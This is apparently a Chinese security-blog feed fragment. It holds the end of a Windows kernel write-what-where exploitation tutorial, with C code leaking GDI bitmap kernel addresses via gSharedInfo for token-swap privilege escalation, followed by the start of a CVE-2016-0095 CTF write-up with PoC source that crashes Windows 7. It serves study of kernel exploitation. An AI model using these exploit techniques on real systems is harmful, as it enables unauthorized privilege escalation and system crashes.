<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x000000c4`d0540000 </span><br><span class="line">0: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 1984 = 00000000`000007c0</span><br><span class="line">0: kd&gt; dq 0x000000c4`d0540000+0x18*7c0</span><br><span class="line">000000c4`d054ba00  fffff901`40701010 40053105`00000c3c</span><br><span class="line">000000c4`d054ba10  00000000`00000000 fffff901`43c5d010</span><br><span class="line">000000c4`d054ba20  40012201`00000c3c 000000c4`d0170b60</span><br><span class="line">000000c4`d054ba30  fffff901`446c4190 41051405`00000000</span><br><span class="line">000000c4`d054ba40  00000000`00000000 fffff901`400d6ab0</span><br><span class="line">000000c4`d054ba50  40084308`00000000 00000000`00000000</span><br><span class="line">000000c4`d054ba60  00000000`00000776 44003501`00000000</span><br><span class="line">000000c4`d054ba70  00000000`00000000 fffff901`407e6010</span><br><span class="line">0: kd&gt; dq fffff901`40701010</span><br><span class="line">fffff901`40701010  00000000`310507c0 80000000`00000000</span><br><span class="line">fffff901`40701020  00000000`00000000 00000000`00000000</span><br><span class="line">fffff901`40701030  00000000`310507c0 00000000`00000000</span><br><span class="line">fffff901`40701040  00000000`00000000 00000002`00000010</span><br><span class="line">fffff901`40701050  00000000`00000020 fffff901`40701268</span><br><span class="line">fffff901`40701060  fffff901`40701268 00002472`00000010</span><br><span class="line">fffff901`40701070  00010000`00000003 00000000`00000000</span><br><span class="line">fffff901`40701080  00000000`04800200 00000000`00000000</span><br></pre></td></tr></table></figure>
<p><strong>Win 10 1511 x64</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x00000216`aa740000 </span><br><span class="line">0: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 2711 = 00000000`00000a97</span><br><span class="line">0: kd&gt; dq 0x00000216`aa740000+0x18*a97</span><br><span class="line">00000216`aa74fe28  fffff901`4222aca0 4005e605`00000dec</span><br><span class="line">00000216`aa74fe38  00000000`00000000 00000000`00000936</span><br><span class="line">00000216`aa74fe48  40004205`00000000 00000000`00000000</span><br><span class="line">00000216`aa74fe58  00000000`00000a98 40004105`00000000</span><br><span class="line">00000216`aa74fe68  00000000`00000000 fffff901`441e4380</span><br><span class="line">00000216`aa74fe78  40102310`000006c8 000001fc`d4640fc0</span><br><span class="line">00000216`aa74fe88  00000000`00000abf 40008404`00000000</span><br><span class="line">00000216`aa74fe98  00000000`00000000 fffff901`406d94d0</span><br><span class="line">0: kd&gt; dq fffff901`4222aca0</span><br><span class="line">fffff901`4222aca0  ffffffff`e6050a97 80000000`00000000</span><br><span class="line">fffff901`4222acb0  00000000`00000000 00000000`00000000</span><br><span class="line">fffff901`4222acc0  ffffffff`e6050a97 00000000`00000000</span><br><span class="line">fffff901`4222acd0  00000000`00000000 00000002`00000010</span><br><span class="line">fffff901`4222ace0  00000000`00000020 fffff901`4222aef8</span><br><span class="line">fffff901`4222acf0  fffff901`4222aef8 00008999`00000010</span><br><span class="line">fffff901`4222ad00  00010000`00000003 00000000`00000000</span><br><span class="line">fffff901`4222ad10  00000000`04800200 00000000`00000000</span><br></pre></td></tr></table></figure>
<p><strong>Win 10 1607 x64</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x0000023e`1a210000 </span><br><span class="line">3: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 3111 = 00000000`00000c27</span><br><span class="line">3: kd&gt; dq 0x0000023e`1a210000+0x18*c27</span><br><span class="line">0000023e`1a2223a8  ffffffff`ff540c27 00055405`00001a20</span><br><span class="line">0000023e`1a2223b8  00000000`00000000 00000000`00000b3e</span><br><span class="line">0000023e`1a2223c8  0000600a`00000001 00000000`00000000</span><br><span class="line">0000023e`1a2223d8  00000000`00000a90 00004104`00000001</span><br><span class="line">0000023e`1a2223e8  00000000`00000000 00000000`00000aea</span><br><span class="line">0000023e`1a2223f8  00003505`00000001 00000000`00000000</span><br><span class="line">0000023e`1a222408  ffffffff`ff810c2b 00018101`00000918</span><br><span class="line">0000023e`1a222418  0000019d`678a0820 00000000`00000acc</span><br><span class="line">3: kd&gt; dq ffffffff`ff540c27</span><br><span class="line">ffffffff`ff540c27  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c37  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c47  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c57  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c67  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c77  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c87  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c97  ????????`???????? ????????`????????</span><br></pre></td></tr></table></figure>
<p>实验中很明显的发现win 10 1607中我们的<code>GdiShreadHanldleTable</code>已经不是一个指针了，我们来看看有什么升级，图片中说明了已经不能够公开这个句柄表的地址了,那是不是就没办法了呢?</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/12.png" alt="1564987015367"></p>
<p>当然不是!我们总能够通过各种方法来泄露我们的 PrvScan0 ，这里就需要引入另外一个比较神奇的结构<code>gSharedInfo</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SHAREDINFO</span> &#123;</span></span><br><span class="line">	PSERVERINFO psi;</span><br><span class="line">	PUSER_HANDLE_ENTRY aheList;</span><br><span class="line">	ULONG HeEntrySize;</span><br><span class="line">	ULONG_PTR pDispInfo;</span><br><span class="line">	ULONG_PTR ulSharedDelts;</span><br><span class="line">	ULONG_PTR awmControl;</span><br><span class="line">	ULONG_PTR DefWindowMsgs;</span><br><span class="line">	ULONG_PTR DefWindowSpecMsgs;</span><br><span class="line">&#125; SHAREDINFO, * PSHAREDINFO;</span><br></pre></td></tr></table></figure>
<p>其中的 <code>aheList</code> 结构如下，里面就保存了一个 pKernel 的指针，指向这个句柄的内核地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">USER_HANDLE_ENTRY</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span>* pKernel;</span><br><span class="line">	<span class="keyword">union</span></span><br><span class="line">	&#123;</span><br><span class="line">		PVOID pi;</span><br><span class="line">		PVOID pti;</span><br><span class="line">		PVOID ppi;</span><br><span class="line">	&#125;;</span><br><span class="line">	BYTE type;</span><br><span class="line">	BYTE flags;</span><br><span class="line">	WORD generation;</span><br><span class="line">&#125; USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;</span><br></pre></td></tr></table></figure>
<p>先不管三七二十一，我们先泄露这个东西，再看看和我们的 Bitmap 有什么联系，关键代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LPACCEL lPaccel = <span class="literal">NULL</span>;</span><br><span class="line">PUSER_HANDLE_ENTRY leakaddr = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE huser32 = <span class="literal">NULL</span>;</span><br><span class="line">HACCEL hAccel = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> nSize = <span class="number">700</span>;</span><br><span class="line"></span><br><span class="line">lPaccel = (LPACCEL)LocalAlloc(LPTR, <span class="keyword">sizeof</span>(ACCEL) * nSize);</span><br><span class="line">PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(</span><br><span class="line">	GetModuleHandleW(<span class="string">L"user32.dll"</span>), </span><br><span class="line">	<span class="string">"gSharedInfo"</span>);</span><br><span class="line">PUSER_HANDLE_ENTRY handleTable = pfindSharedInfo-&gt;aheList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	hAccel = CreateAcceleratorTable(lPaccel, nSize);</span><br><span class="line">	leakaddr = &amp;handleTable[LOWORD(hAccel)];</span><br><span class="line">	DWORD64 addr = (DWORD64)(leakaddr-&gt;pKernel);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]leak address : 0x%p"</span>, leakaddr-&gt;pKernel);</span><br><span class="line">	DestroyAcceleratorTable(hAccel);</span><br><span class="line">	<span class="keyword">if</span>(i = <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CreateBitmap(<span class="number">0x710</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行一下查看结果，确实泄露了什么东西出来</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/8.png" alt="1564969195115"></p>
<p>解读一下上面的代码，我们首先创建了一块内存，其中的nSize选择了700的大小，因为后面我们使用<code>CreateBitmap</code>创建的对象传入的第一个参数是0x710，关于<code>CreateBitmap</code>中第一个参数<code>width</code>对生成对象的影响我就不过多阐述了，实验加上<a href="https://docs.microsoft.com/en-us/previous-versions/aa929704(v=msdn.10" target="_blank" rel="noopener">官方文档</a>)可以给我们解释，然后我们获取了 user32.dll 中的  gSharedInfo 对象，我们在一个循环里使用 CreateAcceleratorTable 和 DestroyAcceleratorTable 不断创建释放了 hAccel 结构，其中计算的过程和我们泄露bitmap地址的过程类似，这里就会产生一个疑问，这个泄露的东西为什么和我们的 Bitmap 一样呢，要知道我们每次创建释放hAccel时候地址是固定的(你可以多打印几次进行实验)，并且这个对象也是分配在会话池(sesssion pool)，大小又相等，池类型又相同，如果我们申请了一块然后释放了，再用bitmap申请岂不是就可以申请到我们想要的地方，泄露的地址也就是bitmap的地址了，我们这里为了使得到的地址固定，堆喷射后使用了一个判断语句判断是否得到了稳定的地址，得到之后我们再加上相应的偏移也就是我们的 PrvScan0 了，于是我们构造如下代码片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LeakBitmapInfo <span class="title">GetBitmap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT loadCount = <span class="number">0</span>;</span><br><span class="line">	HACCEL hAccel = <span class="literal">NULL</span>;</span><br><span class="line">	LPACCEL lPaccel = <span class="literal">NULL</span>;</span><br><span class="line">	PUSER_HANDLE_ENTRY firstEntryAddr = <span class="literal">NULL</span>;</span><br><span class="line">	PUSER_HANDLE_ENTRY secondEntryAddr = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> nSize = <span class="number">700</span>;</span><br><span class="line">	<span class="keyword">int</span> handleIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	PUCHAR firstAccelKernelAddr;</span><br><span class="line">	PUCHAR secondAccelKernelAddr;</span><br><span class="line"></span><br><span class="line">	PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(<span class="string">L"user32.dll"</span>), <span class="string">"gSharedInfo"</span>);	<span class="comment">// 获取gSharedInfo表</span></span><br><span class="line">	PUSER_HANDLE_ENTRY gHandleTable = pfindSharedInfo-&gt;aheList;</span><br><span class="line">	LeakBitmapInfo retBitmap;</span><br><span class="line"></span><br><span class="line">	lPaccel = (LPACCEL)LocalAlloc(LPTR, <span class="keyword">sizeof</span>(ACCEL) * nSize);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (loadCount &lt; <span class="number">20</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		hAccel = CreateAcceleratorTable(lPaccel, nSize);	</span><br><span class="line"></span><br><span class="line">		handleIndex = LOWORD(hAccel);</span><br><span class="line"></span><br><span class="line">		firstEntryAddr = &amp;gHandleTable[handleIndex];</span><br><span class="line"></span><br><span class="line">		firstAccelKernelAddr = (PUCHAR)firstEntryAddr-&gt;pKernel;</span><br><span class="line">		DestroyAcceleratorTable(hAccel);</span><br><span class="line"></span><br><span class="line">		hAccel = CreateAcceleratorTable(lPaccel, nSize);	</span><br><span class="line"></span><br><span class="line">		handleIndex = LOWORD(hAccel);</span><br><span class="line"></span><br><span class="line">		secondEntryAddr = &amp;gHandleTable[handleIndex];</span><br><span class="line"></span><br><span class="line">		secondAccelKernelAddr = (PUCHAR)firstEntryAddr-&gt;pKernel;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (firstAccelKernelAddr == secondAccelKernelAddr)</span><br><span class="line">		&#123;</span><br><span class="line">			DestroyAcceleratorTable(hAccel);</span><br><span class="line">			LPVOID lpBuf = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x50</span> * <span class="number">2</span> * <span class="number">4</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">			retBitmap.hBitmap = CreateBitmap(<span class="number">0x701</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, lpBuf); </span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DestroyAcceleratorTable(hAccel);</span><br><span class="line">		loadCount++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	retBitmap.pBitmapPvScan0 = firstAccelKernelAddr + <span class="number">0x50</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]bitmap handle is:  0x%08x \n"</span>, (ULONG)retBitmap.hBitmap);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]bitmap pvScan0 at: 0x%p \n\n"</span>, retBitmap.pBitmapPvScan0);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> retBitmap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>泄露了之后就好办了，也就是只需要替换一个token就行了，我这里用的是read和write函数不断的进行汇编shellcode的模仿，在ring3层实现了对token的替换，这样我们就可以不加入我们的shellcode从而提权，而这种方法也不需要考虑堆栈平衡，非常的方便，其中获取系统的一些信息的时候使用了<code>NtQuerySystemInformation</code>这个函数，通过它可以给我们提供很多的系统信息，具体的可以参阅<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation" target="_blank" rel="noopener">官方文档</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">  OUT PVOID                   SystemInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  OUT PULONG                  ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>最后整合一下思路：</p>
<ul>
<li>初始化句柄等结构</li>
<li>通过<code>gSharedInfo</code>对象来泄露我们的Bitmap地址</li>
<li>调用<code>TriggerArbitraryOverwrite</code>函数将一个pvScan0指向另一个pvScan0</li>
<li>通过不断的read和write，模拟token的替换，从而提权</li>
</ul>
<p>最后整合一下代码即可实现利用，整体代码和验证结果参考 =&gt; <a href="https://github.com/ThunderJie/Write-What-Where" target="_blank" rel="noopener">这里</a></p>
<h1 id="0x03：Windows-10-后续版本的猜想"><a href="#0x03：Windows-10-后续版本的猜想" class="headerlink" title="0x03：Windows 10 后续版本的猜想"></a>0x03：Windows 10 后续版本的猜想</h1><h2 id="RS2"><a href="#RS2" class="headerlink" title="RS2"></a>RS2</h2><p>RS2版本中貌似将我们的 pkernel 指针给移除了，也就是说我们不能再通过 gSharedInfo 结构来泄露我们的内核地址了，不过有前辈们用<code>tagCLS</code>对象及<code>lpszMenuName</code>对象泄露了内核地址，能够泄露的话其实其他地方都好办了，泄露的方法我这里简单提一下，首先我们需要找到<code>HMValidateHandle</code>函数的地址，这个函数我们只需要传入一个窗口句柄，他就会返回在桌面堆中的<code>tagWND</code>对象指针，而通过这个指针我们就可以泄露出内核地址，这个函数地址我们可以通过<code>IsMenu</code>这个用户态函数获取到，我们来看一下函数的内容，可以看到 call 之后会调用到<code>HMValidateHandle</code>这个函数，那么我们只需要通过硬编码计算，获取 e8(call) 之后的几个字节地址就行了 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; u user32!IsMenu</span><br><span class="line">USER32!IsMenu:</span><br><span class="line">00007fff`17d489e0 4883ec28        sub     rsp,28h</span><br><span class="line">00007fff`17d489e4 b202            mov     dl,2</span><br><span class="line">00007fff`17d489e6 e805380000      call    USER32!HMValidateHandle (00007fff`17d4c1f0)</span><br><span class="line">00007fff`17d489eb 33c9            xor     ecx,ecx</span><br><span class="line">00007fff`17d489ed 4885c0          test    rax,rax</span><br><span class="line">00007fff`17d489f0 0f95c1          setne   cl</span><br><span class="line">00007fff`17d489f3 8bc1            mov     eax,ecx</span><br><span class="line">00007fff`17d489f5 4883c428        add     rsp,28h</span><br></pre></td></tr></table></figure>
<p>获取到<code>HMValidateHandle</code>函数之后我们只需要再进行一系列的计算获取<code>lpszMenuName</code>对象的地址，我们可以依据下图 Morten 所说的计算过程计算出<code>Client delta</code></p>
<p><img src="/2019/08/19/www漏洞从win7-win10/13.png" alt="1565142151413"></p>
<p>获取到了之后我们只需要和前面一样进行堆喷加上判断就能够泄露出Bitmap的地址，还需要注意的是偏移的问题，需要简要修改，下面是1703的一些偏移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; dt nt!_EPROCESS uniqueprocessid token activeprocesslinks</span><br><span class="line">   +0x2e0 UniqueProcessId    : Ptr64 Void</span><br><span class="line">   +0x2e8 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x358 Token              : _EX_FAST_REF</span><br></pre></td></tr></table></figure>
<h2 id="RS3"><a href="#RS3" class="headerlink" title="RS3"></a>RS3</h2><p>RS3版本中 PvScan0 已经放进了堆中，既然是堆的话，又让人想到了堆喷射控制内核池，总之可以尝试一下这种方法</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/9.png" alt="1564977577246"></p>
<p>但是前辈们总有奇特的想法，又找到了另外一个对象 platte ，它类似与 bitmap 结构，可以用 <code>CreatePalette</code> 函数创建，结构如下</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/10.png" alt="1564986199191"></p>
<p>任意读写的方法只是改为了<code>GetPaletteEntries</code>和<code>SetPaletteEntries</code>，以后可以尝试一下这个思路</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/11.png" alt="1564986238536"></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>利用里面，win8.1的坑比较多，和win7比起来差距有点大，需要细心调试，更往后的版本主要是参阅外国的文献，以后有时间再来实践</p>
<p>参考资料：</p>
<p>[+] SMEP原理及绕过：<a href="http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html" target="_blank" rel="noopener">http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html</a></p>
<p>[+] ROP的选择：<a href="http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html" target="_blank" rel="noopener">http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html</a></p>
<p>[+] Bitmap结构出处：<a href="http://gflow.co.kr/window-kernel-exploit-gdi-bitmap-abuse/" target="_blank" rel="noopener">http://gflow.co.kr/window-kernel-exploit-gdi-bitmap-abuse/</a></p>
<p>[+] wjllz师傅的博客：<a href="https://redogwu.github.io/" target="_blank" rel="noopener">https://redogwu.github.io/</a></p>
<p>[+] 参阅过的pdf：<a href="https://github.com/ThunderJie/Study_pdf" target="_blank" rel="noopener">https://github.com/ThunderJie/Study_pdf</a></p>
<p>[+] RS2上的利用分析：<a href="https://www.anquanke.com/post/id/168441#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168441#h2-3</a></p>
<p>[+] RS3上 platte 对象的利用分析：<a href="https://www.anquanke.com/post/id/168572" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168572</a></p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Write What Where</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-0095</title>
    <url>/2019/08/19/CVE-2016-0095/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>本篇文章从SSCTF中的一道Kernel Pwn题目来分析CVE-2016-0095(MS16-034)，CVE-2016-0095是一个内核空指针解引用的漏洞，这道题目给了poc，要求我们根据poc写出相应的exploit，利用平台是Windows 7 x86 sp1(未打补丁)</p>
<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><p>题目给了我们一个poc的源码，我们查看一下源码，这里我稍微对源码进行了修复，在VS上测试可以编译运行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Author: bee13oy of CloverSec Labs</span></span><br><span class="line"><span class="comment">* BSoD on Windows 7 SP1 x86 / Windows 10 x86</span></span><br><span class="line"><span class="comment">* EoP to SYSTEM on Windows 7 SP1 x86</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"gdi32.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"user32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> W32KAPI</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> W32KAPI  DECLSPEC_ADDRSAFE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">demo_CreateBitmapIndirect</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> BITMAP bitmap = &#123; <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</span><br><span class="line">	<span class="keyword">static</span> BYTE bits[<span class="number">8</span>][<span class="number">2</span>] = &#123; <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	bitmap.bmBits = bits;</span><br><span class="line"></span><br><span class="line">	SetLastError(NO_ERROR);</span><br><span class="line"></span><br><span class="line">	HBITMAP hBitmap = CreateBitmapIndirect(&amp;bitmap);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hBitmap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eSyscall_NtGdiSetBitmapAttributes 0x1110</span></span><br><span class="line"></span><br><span class="line"><span class="function">W32KAPI HBITMAP NTAPI <span class="title">NtGdiSetBitmapAttributes</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HBITMAP argv0,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD argv1</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE _H_NTDLL = <span class="literal">NULL</span>;</span><br><span class="line">	PVOID addr_kifastsystemcall = <span class="literal">NULL</span>;</span><br><span class="line">	_H_NTDLL = LoadLibrary(TEXT(<span class="string">"ntdll.dll"</span>));</span><br><span class="line">	addr_kifastsystemcall = (PVOID)GetProcAddress(_H_NTDLL, <span class="string">"KiFastSystemCall"</span>);</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push argv1;</span><br><span class="line">		push argv0;</span><br><span class="line">		push <span class="number">0x00</span>;</span><br><span class="line">		mov eax, eSyscall_NtGdiSetBitmapAttributes;</span><br><span class="line">		mov edx, addr_kifastsystemcall;</span><br><span class="line">		call edx;</span><br><span class="line">		add esp, <span class="number">0x0c</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Trigger_BSoDPoc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();</span><br><span class="line">	HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)<span class="number">0x8f9</span>);</span><br><span class="line"></span><br><span class="line">	RECT rect = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	rect.left = <span class="number">0x368c</span>;</span><br><span class="line">	rect.top = <span class="number">0x400000</span>;</span><br><span class="line">	HRGN hRgn = (HRGN)CreateRectRgnIndirect(&amp;rect);</span><br><span class="line"></span><br><span class="line">	HDC hdc = (HDC)CreateCompatibleDC((HDC)<span class="number">0x0</span>);</span><br><span class="line">	SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);</span><br><span class="line"></span><br><span class="line">	HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)<span class="number">0x00edfc13</span>);</span><br><span class="line"></span><br><span class="line">	FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Trigger_BSoDPoc();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译之后在win 7 x86中运行发现蓝屏，我们在windbg中回溯一下，可以发现我们最后问题出在在win32k模块中的<code>bGetRealizedBrush</code>函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; g</span><br><span class="line">Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">win32k!bGetRealizedBrush+0x38:</span><br><span class="line">95d40560 f6402401        test    byte ptr [eax+24h],1</span><br><span class="line">3: kd&gt; k</span><br><span class="line"> # ChildEBP RetAddr  </span><br><span class="line">00 97e509a0 95d434af win32k!bGetRealizedBrush+0x38</span><br><span class="line">01 97e509b8 95db9b5e win32k!pvGetEngRbrush+0x1f</span><br><span class="line">02 97e50a1c 95e3b6e8 win32k!EngBitBlt+0x337</span><br><span class="line">03 97e50a54 95e3bb9d win32k!EngPaint+0x51</span><br><span class="line">04 97e50c20 83e3f1ea win32k!NtGdiFillRgn+0x339</span><br><span class="line">05 97e50c20 77c170b4 nt!KiFastCallEntry+0x12a</span><br></pre></td></tr></table></figure>
<p>我们在此时在windbg中查看一下<code>byte ptr [eax+24h]</code>的内容，发现<code>eax+24</code>根本没有映射内存，此时的eax为0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dd eax+24</span><br><span class="line">00000024  ???????? ???????? ???????? ????????</span><br><span class="line">00000034  ???????? ???????? ???????? ????????</span><br><span class="line">00000044  ???????? ???????? ???????? ????????</span><br><span class="line">00000054  ???????? ???????? ???????? ????????</span><br><span class="line">00000064  ???????? ???????? ???????? ????????</span><br><span class="line">00000074  ???????? ???????? ???????? ????????</span><br><span class="line">00000084  ???????? ???????? ???????? ????????</span><br><span class="line">00000094  ???????? ???????? ???????? ????????</span><br><span class="line">3: kd&gt; r</span><br><span class="line">eax=00000000 ebx=97e50af8 ecx=00000001 edx=00000000 esi=00000000 edi=fe973ae8</span><br><span class="line">eip=95d40560 esp=97e50928 ebp=97e509a0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246</span><br><span class="line">win32k!bGetRealizedBrush+0x38:</span><br><span class="line">95d40560 f6402401        test    byte ptr [eax+24h],1       ds:0023:00000024=??</span><br></pre></td></tr></table></figure>
<p>我们在IDA中分析一下该函数的基本结构，首先我们可以得到这个函数有三个参数，两个结构体指针，一个函数指针，中间的哪个参数我重命名了一下</p>
